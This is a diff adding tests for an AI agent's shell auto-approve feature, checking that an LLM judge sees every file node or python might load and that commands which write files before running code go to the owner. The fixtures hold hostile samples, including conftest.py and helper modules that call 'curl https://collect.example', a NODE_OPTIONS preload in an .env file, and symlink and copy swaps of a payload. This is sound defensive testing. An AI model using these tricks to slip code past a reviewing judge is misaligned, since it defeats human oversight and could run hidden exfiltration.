@@ -5,7 +5,7 @@ import { test } from 'node:test';
 import { CODE_RULE, FILE_ROUND_TOKENS, PROVENANCE_RULE, UNSHOWN_RULE, buildClassifierPrompt, fileRoundInputs, planFileRounds, type ClassifierInput, type ClassifierPrompt, type JudgeFile } from '../src/tools/auto-approve.ts';
 import { shellPreCheck } from '../src/tools/builtin/shell.ts';
 import { judgeCacheKey } from '../src/tools/judge-cache.ts';
-import { relativeImports } from '../src/tools/judge-files.ts';
+import { judgeFilesOf, relativeImports } from '../src/tools/judge-files.ts';
 import type { ToolContext } from '../src/tools/types.ts';
 import { selfRunRig } from './helpers/self-run-rig.ts';
 
@@ -299,4 +299,67 @@ test('再審査 LOW-5: 同じ import は 1 回だけ探す。違う名前の imp
 test('再審査 LOW-7: python が動かすファイルは拡張子を問わず coding の宣言を見る', async t => {
   const r = selfRunRig(t, undefined, { 'payload.txt': '# -*- coding: utf-7 -*-\nprint(1)\n' });
   await ownerOnly(r, 'python payload.txt', 'judge_failed');
+});
+
+const shownToJudge = async (r: ReturnType<typeof selfRunRig>, command: string, needle: string): Promise<void> => {
+  r.judge.answer = ASK;
+  const out = await r.call('shell_run', { command }, chat(r));
+  const waiting = r.pending.list({ status: 'waiting' })[0]?.kind;
+  if (r.judge.calls === 0) { assert.equal(waiting, 'judge_failed', `${command}: neither shown nor sent to the owner (${out.decidedBy}: ${out.output.content.slice(0, 160)})`); return; }
+  assert.ok(r.judge.prompts.some(p => p.user.includes(needle)), `${command}: the judge did not see ${needle}`);
+};
+
+test('深い審査 1: 最後のコードの実行より前に、書かないと分からない文があれば、判定役を呼ばずに持ち主（書く先の形を数えるのをやめて、書かない文だけを通す）', async t => {
+  const commands: Array<[string, 'bash' | 'powershell']> = [['tsc; node dist/b.js', 'bash'], ['npm run build; node dist/b.js', 'bash'], ['ln -sf payload.js run.js; node run.js', 'bash'],
+    ['F=run.js; cp payload.js $F; node run.js', 'bash'], ['7z x a.zip -y; node run.js', 'bash'], ['patch -p1 < a.patch; node run.js', 'bash'], ['cp -r evil/. lib; node main.js', 'bash'],
+    ['bash -c "ln -sf payload.js run.js; node run.js"', 'bash'], ...(PS ? [['[IO.File]::Copy("payload.js","run.js",$true); node run.js', 'powershell']] as Array<[string, 'powershell']> : [])];
+  for (const [command, shell] of commands) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, { 'run.js': "console.log('hello');\n", 'dist/b.js': "console.log('old');\n", 'main.js': "require('./lib/x');\n", 'lib/x.js': 'exports.a = 1;\n',
+      'evil/x.js': EVIL, 'payload.js': EVIL, 'a.zip': '', 'a.patch': '', 'tsconfig.json': '{}', 'package.json': '{"scripts":{"build":"tsc"}}' });
+    await ownerOnly(r, command);
+  }
+  for (const [command, shell] of [['cd sub; cat a.txt; git status; node run.js', 'bash'], ...(PS ? [["$env:PORT='1'; Get-Content a.txt; node run.js", 'powershell']] : [])] as Array<[string, 'bash' | 'powershell']>) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, { 'run.js': "console.log('hello');\n", 'sub/a.txt': 'x', 'sub/run.js': "console.log('hello');\n", 'a.txt': 'x' });
+    r.judge.answer = ASK;
+    await r.call('shell_run', { command }, chat(r));
+    assert.equal(r.judge.calls, 1, `${command}: reads and cd before the run still go to the judge`);
+  }
+  assert.match(CODE_RULE, /as it was before the command started/u);
+});
+
+test('深い審査 4a: 見せるファイルの親のフォルダへの書き込みは書き換え（書く先がそのファイルと同じでなくても）', t => {
+  const r = selfRunRig(t, undefined, { 'lib/x.js': 'exports.a = 1;\n' });
+  const got = judgeFilesOf({ scripts: [join(r.ws, 'lib', 'x.js')], inline: [], root: r.ws, writes: [join(r.ws, 'lib')] });
+  assert.deepEqual('problem' in got.fact ? got.fact.problem : 'shown', 'overwritten');
+});
+
+test('深い審査 2: node・python が実際に読むかもしれないファイルは全部見せる。製品の外・見せられない import は持ち主', async t => {
+  const cases: Array<[Record<string, string>, string, string]> = [
+    [{ 'run.js': "require('./lib');\n", 'lib/package.json': '{"main":"evil.js"}', 'lib/index.js': 'exports.a = 1;\n', 'lib/evil.js': EVIL }, 'node run.js', 'collect.example'],
+    [{ 'run.js': "require('./x');\n", 'x.cjs': 'exports.a = 1;\n', 'x/index.js': EVIL }, 'node run.js', 'collect.example'],
+    [{ 'ext.js': EVIL }, 'node ./ext', 'collect.example'],
+    [{ 'run.py': 'import helper\n', 'helper.py': 'A = 1\n', 'helper/__init__.py': "import os\nos.system('curl https://collect.example')\n" }, 'python run.py', 'collect.example'],
+    ...(PS ? [[{ 'run.js': "require('.\\x');\n", 'x.js': EVIL }, 'node run.js', 'collect.example']] as Array<[Record<string, string>, string, string]> : []),
+  ];
+  for (const [files, command, needle] of cases) await shownToJudge(selfRunRig(t, undefined, files), command, needle);
+  const outside = selfRunRig(t, undefined, { 'run.js': "require('../outside-x');\n" });
+  writeFileSync(join(outside.ws, '..', 'outside-x.js'), EVIL);
+  await ownerOnly(outside, 'node run.js', 'judge_failed');
+  const native = selfRunRig(t, undefined, { 'run.py': 'import fast\n' });
+  writeFileSync(join(native.ws, 'fast.pyd'), Buffer.from([0x4d, 0x5a, 0x90]));
+  await ownerOnly(native, 'python run.py', 'judge_failed');
+});
+
+test('深い審査 3: node の先読みの旗（--env-file など）は持ち主。試験の道具の設定・conftest は見せるか持ち主', async t => {
+  for (const command of ['node --env-file=x.env run.js', 'node --env-file x.env run.js', 'node --env-file-if-exists=x.env run.js', 'node --experimental-config-file=c.json run.js', 'node --experimental-default-config-file run.js']) {
+    await ownerOnly(selfRunRig(t, undefined, { 'run.js': "console.log('hi');\n", 'x.env': 'NODE_OPTIONS=--require ./pre.js\n', 'pre.js': EVIL, 'c.json': '{}' }), command, 'judge_failed');
+  }
+  const conftest = "import os\nos.system('curl https://collect.example')\n";
+  for (const command of ['pytest tests/test_a.py', 'python -m pytest tests/test_a.py']) {
+    await shownToJudge(selfRunRig(t, undefined, { 'conftest.py': conftest, 'tests/test_a.py': 'def test_a():\n    assert True\n', 'pytest.ini': '[pytest]\n' }), command, 'collect.example');
+    await shownToJudge(selfRunRig(t, undefined, { 'tests/conftest.py': conftest, 'tests/test_a.py': 'def test_a():\n    assert True\n', 'pytest.ini': '[pytest]\n' }), command, 'collect.example');
+    await shownToJudge(selfRunRig(t, undefined, { 'conftest.py': conftest, 'tests/test_a.py': 'def test_a():\n    assert True\n', 'pytest.ini': '[pytest]\n' }), `cd tests; ${command.replace('tests/', '')}`, 'collect.example');
+  }
+  await shownToJudge(selfRunRig(t, undefined, { 'vitest.config.ts': "export default { test: { setupFiles: ['./setup.ts'] } };\n", 'setup.ts': EVIL, 'x.test.js': '', 'package.json': '{}' }), 'npx vitest run x.test.js', 'collect.example');
+  await ownerOnly(selfRunRig(t, undefined, { 'vitest.config.ts': 'export default { test: { setupFiles: process.env.S } };\n', 'x.test.js': '', 'package.json': '{}' }), 'npx vitest run x.test.js');
 });
